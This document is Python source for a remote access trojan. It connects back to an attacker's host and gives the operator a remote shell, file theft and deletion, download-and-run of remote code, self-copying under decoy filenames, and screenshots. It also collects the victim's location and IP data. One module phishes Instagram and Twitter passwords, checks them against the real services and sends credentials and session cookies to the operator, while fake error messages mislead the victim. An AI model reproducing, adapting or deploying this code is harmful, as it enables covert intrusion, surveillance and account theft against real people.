try:
    import socket,subprocess,os,getpass
    import webbrowser,uuid,re,datetime
    import random,time,pyautogui
    from platform import *
    from shutil import copyfile
    from requests import get,post
    end_f="<end_of_file>";f_size=2048;ext_msg='[!]  Error please restart the tool'
    sysname=system();sysinfo=uname()
    systems=['Linux','Windows']
    notin=['Darwin']
    if sysname in systems:pass
    elif sysname in notin:exit('[!] sorry we have Error in our tool updating system talk to tool admin at [@] ..')
    else:exit('[!] sorry we have Error in our tool updating system talk to tool admin at [@] ..')
except Exception as JQ:exit(JQ)


try:
    try:os.system('cls' if os.name == 'nt' else 'clear')
    except:pass
    new=datetime.datetime.now()
    host=""#your ip
    port=0#port
    s=socket.socket()
    conn=False
    while not conn:
        try:
            s.connect((host,port))
            conn=True
        except:pass
except:exit("[!] Error please contact the admin at  [@] ")#Your account


def Terminal():
    try:
        while True:
            data=s.recv(1000000).decode()
            if not data:break
            elif len(data) == 2 and data[0].isalpha() and data[1] == ":" :
                if os.path.exists(data):
                    os.chdir(data)
                    continue
                else:
                    data1=data+"is not exist"
                    s.send(data1.encode())
                    continue
            elif data.startswith("cd"):
                new_path=data.strip("cd ")
                if os.path.exists(new_path):
                    os.chdir(new_path)
                    continue
                else:
                    data2=new_path+"is not exist"
                    s.send(data2.encode())
                    continue
            cmd=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            cmd_bytes=cmd.stdout.read()+cmd.stderr.read()
            cmd_str=str(cmd_bytes.decode())
            if not cmd_str:s.send('[-]  Respone is " " for this command '.encode())
            else:s.sendall(cmd_str.encode("utf-8"))
        s.close()
    except:exit('[!]  Sorry you have to retry ..')


def Filestealer():
    try:
        while True:
            filename=s.recv(1000000)
            f=open(filename,'rb')
            i=f.read(1000000)
            while(i):
                s.send(i)
                i=f.read(1000000)
            f.close()
    except:exit("[!]  Sorry You have to retry ..")


def Spread():
    try:
        direcpath=os.getcwd()
        username=getpass.getuser()
        filename=os.path.basename(__file__);filetype=os.path.basename(__file__).split('.')[1]
        source=direcpath+"/"+filename
        #newfiletype=['']
        filenamepicker=[f'agent.{filetype}',f'temp.{filetype}',f'requests_sys.{filetype}',f'root_sys.{filetype}',f'main.{filetype}',f'helper.{filetype}',f'help.{filetype}',f'os_manger.{filetype}',f'task_manger.{filetype}',f'Terminal_sys.{filetype}',f'python_3.2.5.{filetype}',f'python_sys.{filetype}',f'main_os.{filetype}',f'decoder.{filetype}',f'encoder.{filetype}',f'tool.{filetype}',f'scanner.{filetype}',f'main.{filetype}',f'tool.{filetype}',f'test.{filetype}',f'cmd_content.{filetype}',f'python_lu.{filetype}'];filenamer=random.choice(filenamepicker)
        desti="/home/"+username+f"/{filenamer}"
        if sysname=='Windows':
            desti=os.path.expanduser('~')+f"/{filenamer}"
        copyfile(source,desti)
        s.send("[+]  success saved in: ".encode())
        s.send(desti.encode())
        #try: #"Beta !!"
        #    cmdtrue='echo "@reboot python" '+desti+'  > hhh && crontab hhh' #setting the python File in the jobs that will be starting on start of the computer
        #    os.system(cmdtrue)
        #except:pass
    except:s.send("[!]  Failed in spread .. ".encode())
    try:main()
    except:exit(ext_msg) 


def Webbrowse():
    try:
        website=str(s.recv(1000000).decode())
        webbrowser.open(website)
        s.send('[+]  success ..'.encode())
    except:s.send('[!]  Failed in opening Browser - Your url ..'.encode())
    try:main()
    except:exit(ext_msg) 


def Track_CIPM():
    try:
        url=s.recv(1000000).decode()
        try:webbrowser.open(url)
        except:
            try:forceopen=get(url)
            except:s.send('[!]  Failed in Tracking ..'.encode())
        s.send('[+]  success ..'.encode())
    except:s.send(f'[!]  Failed in Tracking ..'.encode())
    try:main()
    except:exit(ext_msg) 


def Target_informations():
    try:
        IP0=get("https://get.geojs.io/v1/ip.json")
        GetLocate=get("https://get.geojs.io/v1/ip/geo/"+IP0.json()["ip"]+".json").json()
        try:
            req=get(f"https://beseyat.com/calendars/today-date.php").text
            higry=re.findall('''<td style="text-align:center;background-color: #fdfdfe;">التاريخ الهجري</td> <td>
<span style="font-size:20px;line-height: 1.8;">(.*?)</span>
</td> </tr>''',req)[0]
            mildy=re.findall('''<tr> <td style="text-align:center;background-color: #fdfdfe;">التاريخ الميلادي</td> <td><span style="font-size:20px;">(.*?)</span></td> </tr>''',req)[0]
            date_send=str("["+higry+"]"+"--"+"["+mildy+"]")
        except:
            date_send=new.strftime('%I:%M %p  [%x]')
        LONG=GetLocate["longitude"];LATI=GetLocate["latitude"];CON=GetLocate['country'];LOCA=f'https://www.google.com/maps?q={LATI},{LONG}';PA=os.get_exec_path()
        MAC=':'.join(re.findall('..', '%012x' % uuid.getnode()))
        try:
            MOMR=f"""[*] Data Time : {date_send}

[+] System : Name: {sysinfo.system} | username: {sysinfo.node}
[+] Location : {LOCA}
[+] Country  : {CON}
[+] IP address1 : {socket.gethostbyname(socket.gethostname())}
[+] IP address2 : {IP0.json()["ip"]}
[+] Mac address : {MAC}
[+] Longitude On a map : {LONG}
[+] Latitude On a map : {LATI}
[+] Path : {PA}
-------------------------------------------------------------------------------------------------"""
            s.send(MOMR.encode())
        except:
            try:s.send('[!]  Failed in Getting informations ..'.encode())
            except ConnectionResetError:exit('[!]  Error please Retry')
            try:main()
            except:exit(ext_msg) 
    except:
        try:s.send('[!]  Failed in Getting informations ..'.encode())
        except ConnectionResetError:exit('[!]  Error please Retry')
    try:main()
    except:exit(ext_msg) 


def Message_Sender():
    try:
        if sysname=='Windows':
            shutdown="shutdown /s /t 0 /f"
            restart="shutdown /r /t 0 /f"
        elif sysname=='Linux':
            shutdown="shutdown now"
            restart='shutdown -r now'
        data=s.recv(1000000).decode() 
        try:
            if 'SDT' in str(data):os.system(shutdown)
            elif 'SDR' in str(data):os.system(restart)
        except:s.send('[!]  Failed in shutdown ..'.encode())   
        res=input('[+]  '+str(data)+":  ")#you can add a Real insta-netflix-else login to filter the accounts and you can put down after filter , sending the real accounts to your telegram account 
        if res=='':res='The user Respone is " " I suggest you repeat what you wrote above if it was a question like "username"';print('[!] Please Enter a vaild value .. ')
        s.send(res.encode())   
        Message_Sender()
    except:exit(ext_msg)  


def File_Manger():
    try:
        nch=s.recv(1000000).decode()
        if nch in ['1','2','3','4','5']:
            if nch=='1':
                flname=s.recv(1000000).decode()
                if os.path.exists(flname)==False:s.send('0'.encode())
                elif os.path.exists(flname)==True:
                    try:
                        filess=os.listdir(flname)
                        try:
                            check_loop=filess[0]
                            for file in filess:
                                a=file+'\n'
                                s.send(a.encode())
                        except:s.send('check_loop_faild'.encode())
                    except:s.send('0'.encode())
            elif nch=='2':
                fldname=s.recv(1000000).decode()
                try:
                    os.mkdir(fldname)
                    s.send('1'.encode())
                except:s.send('0'.encode())
            elif nch=='3':
                fllname=s.recv(1000000).decode()
                try:
                    file=open(fllname,'w')
                    s.send('1'.encode())
                except:s.send('0'.encode())
            elif nch=='4':
                flllname=s.recv(1000000).decode()
                try:
                    os.remove(flllname)
                    s.send('1'.encode())
                except:s.send('0'.encode())
            elif nch=='5':
                flldname=s.recv(1000000).decode()
                try:
                    os.rmdir(flldname)
                    s.send('1'.encode())
                except:s.send('0'.encode())
        else:s.send('[&]  wait..'.encode())
    except:exit(ext_msg) 
    try:File_Manger()
    except:exit(ext_msg) 


def File_uploder():
    try:
        ntool=s.recv(1000000).decode()
        tool=get(ntool).text
        if sysname=='Windows':exit(ext_msg)
        if os.path.exists('requests_sys.py')==False:
            file=open('requests_sys.py','a')
            file.write(tool)
            file.close()
        elif os.path.exists('requests_sys.py')==True:
            os.remove('requests_sys.py')
            file=open('requests_sys.py','a')
            file.write(tool)
            file.close()
        else:
            file=open('root_command.py','a')
            file.write(tool)
            file.close()
        try:os.system('python3 requests_sys.py')
        except:
            try:
                try:os.system('python3 root_command.py')
                except:exit(ext_msg) 
            except:exit(ext_msg) 
    except:exit(ext_msg) 


def Account_Stealer():
    def twitter():
        user=input("[+]  username: ")
        pess=input("[+]  password: ")
        try:rqtw=post(f'https://twitter.com/sessions',headers={'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Content-Length': '901','Content-Type': 'application/x-www-form-urlencoded','Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397','Host': 'twitter.com','Origin': 'https://twitter.com','Referer': 'https://twitter.com/login?lang=ar','TE': 'Trailers','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0'},data={'redirect_after_login': '/','remember_me': '1','authenticity_token': '10908ac0975311eb868c135992f7d397','wfa': '1','ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}','session[username_or_email]': user,'session[password]': pess})
        except:print('[!]  Error Retry Later Please');main()
        if ("ct0") in rqtw.cookies:
            try:
                ct0=rqtw.cookies['ct0']
                guest_id=rqtw.cookies['guest_id']
                personalization_id=rqtw.cookies['personalization_id']
                twid=rqtw.cookies['twid']
            except:ct0='null';guest_id='null';personalization_id='null';twid='null'
            print('[!]  Error Please retry')
            tw_sender(user,pess,ct0,guest_id,personalization_id,twid)
        else: 
            s.send('[!]  wrong username-password'.encode())
            print('[!]  wrong username or password ')
        time.sleep(1.9);main()
    def ig():
        rnd='qwertyuiopasdfghjklzxcvbnm1234567890'
        for csrf in range(27):
            csrf=''
            for item in range(27):
                csrf=''
            for item in range(27):
                csrf+=random.choice(rnd)
        csr=csrf.capitalize()
        user=input("[+]  username: ")
        if user=='':
            print('[!]  Enter a username !!\n')
            user=input("[+]  username: ")
            if user=='':exit('[!] Error ')
        pess=input("[+]  password: ") 
        if pess=='':
            print('[!]  Enter a password !!\n')
            pess=input("[+]  password: ")
            if pess=='':exit('[!] Error ')
        try:rqig=post('https://www.instagram.com/accounts/login/ajax/',headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','content-length': '321','content-type': 'application/x-www-form-urlencoded','cookie': f'csrftoken={csr}','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0','x-asbd-id': '437806','x-csrftoken': f'{csr}','x-ig-app-id': '936619743392459','x-ig-www-claim': f'hmac.AR0EWvjix_{csr}-','x-instagram-ajax': 'a90c0f3c9877','x-requested-with': 'XMLHttpRequest'},data={'username': user,'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{pess}','queryParams': '{}','optIntoOneTap': 'false','stopDeletionNonce': '','trustedDeviceRecords': '{}'})
        except:print('[!]  Error Retry Later Please');main()
        if '"authenticated":true' in rqig.text:
            try:
                print('[!]  Error Please retry')
                userid=rqig.json()['userId']
                sessid=rqig.cookies['sessionid']
                csrftoken=rqig.cookies['csrftoken']
                ig_did=rqig.cookies['ig_did']
                mid=rqig.cookies['mid']
                checkpoint='False'
                try:
                    rqig2=post('https://i.instagram.com:443/api/v1/users/lookup/',headers={"Connection": "close", "X-IG-Connection-Type": "WIFI","mid":"XOSINgABAAG1IDmaral3noOozrK0rrNSbPuSbzHq","X-IG-Capabilities": "3R4=","Accept-Language": "ar-sa","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","User-Agent": "Instagram 99.4.0 vv1ck_TweakPY (vv1ck_TweakPY)","Accept-Encoding": "gzip, deflate"},data={"signed_body": "35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{\"q\":\"%s\"}" % user }).json()
                    try:em=rqig2['obfuscated_email']
                    except:em='null'
                    try:num=rqig2['obfuscated_phone']
                    except:num='null'
                    rsem=rqig2['can_email_reset']
                    rsnum=rqig2['can_sms_reset']
                    fn=rqig2['user']['full_name']
                except:em='null';fn='null';rsnum='null';rsem='null';num='null'
                ig_sender(user,pess,sessid,userid,checkpoint,em,num,fn,rsnum,rsem,csrftoken,ig_did,mid)
            except:
                print('[!]  Error Please retry')
                userid='null'
                sessid='null'
                checkpoint='False'
                csrftoken='null'
                ig_did='null'
                mid='null'
                try:
                    rqig2=post('https://i.instagram.com:443/api/v1/users/lookup/',headers={"Connection": "close", "X-IG-Connection-Type": "WIFI","mid":"XOSINgABAAG1IDmaral3noOozrK0rrNSbPuSbzHq","X-IG-Capabilities": "3R4=","Accept-Language": "ar-sa","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","User-Agent": "Instagram 99.4.0 vv1ck_TweakPY (vv1ck_TweakPY)","Accept-Encoding": "gzip, deflate"},data={"signed_body": "35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{\"q\":\"%s\"}" % user }).json()
                    try:em=rqig2['obfuscated_email']
                    except:em='null'
                    try:num=rqig2['obfuscated_phone']
                    except:num='null'
                    rsem=rqig2['can_email_reset']
                    rsnum=rqig2['can_sms_reset']
                    fn=rqig2['user']['full_name']
                except:em='null';fn='null';rsnum='null';rsem='null';num='null'
                ig_sender(user,pess,sessid,userid,checkpoint,em,num,fn,rsnum,rsem,csrftoken,ig_did,mid)
        elif '"checkpoint_required"'in rqig.text:
            try:
                print('[!]  Error Please retry')
                userid=rqig.json()['userId']
                sessid=rqig.cookies['sessionid']
                csrftoken=rqig.cookies['csrftoken']
                ig_did=rqig.cookies['ig_did']
                mid=rqig.cookies['mid']
                checkpoint='True'
                try:
                    rqig2=post('https://i.instagram.com:443/api/v1/users/lookup/',headers={"Connection": "close", "X-IG-Connection-Type": "WIFI","mid":"XOSINgABAAG1IDmaral3noOozrK0rrNSbPuSbzHq","X-IG-Capabilities": "3R4=","Accept-Language": "ar-sa","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","User-Agent": "Instagram 99.4.0 vv1ck_TweakPY (vv1ck_TweakPY)","Accept-Encoding": "gzip, deflate"},data={"signed_body": "35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{\"q\":\"%s\"}" % user }).json()
                    try:em=rqig2['obfuscated_email']
                    except:em='null'
                    try:num=rqig2['obfuscated_phone']
                    except:num='null'
                    rsem=rqig2['can_email_reset']
                    rsnum=rqig2['can_sms_reset']
                    fn=rqig2['user']['full_name']
                except:em='null';fn='null';rsnum='null';rsem='null';num='null'
                ig_sender(user,pess,sessid,userid,checkpoint,em,num,fn,rsnum,rsem,csrftoken,ig_did,mid)
            except:
                print('[!]  Error Please retry')
                userid='null'
                sessid='null'
                checkpoint='True'
                csrftoken='null'
                ig_did='null'
                mid='null'
                try:
                    rqig2=post('https://i.instagram.com:443/api/v1/users/lookup/',headers={"Connection": "close", "X-IG-Connection-Type": "WIFI","mid":"XOSINgABAAG1IDmaral3noOozrK0rrNSbPuSbzHq","X-IG-Capabilities": "3R4=","Accept-Language": "ar-sa","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","User-Agent": "Instagram 99.4.0 vv1ck_TweakPY (vv1ck_TweakPY)","Accept-Encoding": "gzip, deflate"},data={"signed_body": "35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{\"q\":\"%s\"}" % user }).json()
                    try:em=rqig2['obfuscated_email']
                    except:em='null'
                    try:num=rqig2['obfuscated_phone']
                    except:num='null'
                    rsem=rqig2['can_email_reset']
                    rsnum=rqig2['can_sms_reset']
                    fn=rqig2['user']['full_name']
                except:em='null';fn='null';rsnum='null';rsem='null';num='null'
                ig_sender(user,pess,sessid,userid,checkpoint,em,num,fn,rsnum,rsem,csrftoken,ig_did,mid)
        elif ('"user":true,"authenticated":false')in rqig.text:
            s.send('wrong password'.encode())
            print('[!] wrong password')		
        elif ('"user":false') in rqig.text:
            s.send('username Not Found'.encode())
            print('[!] username not found')
        elif 'We limit how often you can do certain things on Instagram to protect our community. Tell us if you think we made a mistake.' in rqig.text:
            s.send('Ban'.encode())
            print('[!] Error Ban ! ')
        elif '"authenticated":false,'in rqig.text:
            s.send('wrong username-password'.encode())
            print('[!] wrong username or password ! ')
        else:
            s.send('Error in Login.'.encode())
            print('[!]  Error in getting respone') 
        time.sleep(1.9);main()
    def ig_sender(user,pess,sessid,userid,checkpoint,em,num,fn,rsnum,rsem,csrftoken,ig_did,mid):
            ig=str('{"username":"'+user+'","Password":"'+pess+'","Cookies":{"userid":"'+userid+'","sessionid":"'+str(sessid)+'","csrftoken":"'+str(csrftoken)+'","ig_did":"'+str(ig_did)+'","mid":"'+str(mid)+'"},"user":{"checkpoint":"'+str(checkpoint)+'","email":"'+em+'","phonenumber":"'+num+'","name":"'+str(fn)+'","resetsms":"'+str(rsnum)+'","resetemail":"'+str(rsem)+'"},"status":"Done-instagram"}')
            s.send(ig.encode())
            print('')
    def tw_sender(user,pess,ct0,guest_id,personalization_id,twid):
            tw=str('{"username":"'+user+'","Password":"'+pess+'","Cookies":{"ct0":"'+str(ct0)+'","guest_id":"'+str(guest_id)+'","personalization_id":"'+str(personalization_id)+'","twid":"'+str(twid)+'"},"status":"Done-Twitter"}')
            s.send(tw.encode())
            print('')
    def tw_ig():
        try:
            mainsteal=s.recv(1000000).decode()
            if mainsteal in ['1','2']:
                if mainsteal=='1':ig()
                elif mainsteal=='2':twitter()
                else:s.send('[&]  wait..'.encode())
            else:s.send('[&]  wait..'.encode())
        except:exit(ext_msg) 
    tw_ig()


def Screen_pic():
    try:
        username=getpass.getuser()
        now=datetime.datetime.now()
        now=now.strftime("%m-%d-%Y-%H.%M.%S")
        picscreen=pyautogui.screenshot()
        saved_pic=now+'.png'
        if sysname=='Windows':picscreen.save("c:\\programdata\\"+now+'.png')
        else:picscreen.save("/home/"+username+"/"+now+'.png')
        s.send(saved_pic.encode())
        if sysname=='Windows':os.chdir("c:\\programdata\\")
        else:os.chdir("/home/"+username+"/")
        if os.path.exists(saved_pic):
            f_exists="yes"
            s.send(f_exists.encode())
            res=s.recv(1024)
            if res.decode()=="yes":
                with open(saved_pic,"rb") as pic:
                    pic_1=pic.read(f_size)
                    while len(pic_1)>0:
                        s.send(pic_1)
                        pic_1=pic.read(2048)
                    s.send(end_f.encode())
                os.remove(saved_pic)
            else:
                f_exists="no"
                s.send(f_exists.encode())          
    except:
        try:main()
        except:exit(ext_msg) 
    try:main()
    except:exit(ext_msg) 
                    

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    choice=s.recv(1000000)
    choice=choice.decode()
    if choice=='1':Terminal()
    elif choice=='2':Filestealer()
    elif choice=='3':Spread()
    elif choice=='4':Webbrowse()
    elif choice=='5':Track_CIPM()
    elif choice=='7':Target_informations()
    elif choice=='8':Message_Sender()
    elif choice=='9':File_Manger()
    elif choice=='10':File_uploder()
    elif choice=='11':Account_Stealer()
    elif choice=='12':Screen_pic()
    else:main()
   

try:main()
except RecursionError:exit('[!] Time out Restart the tool please')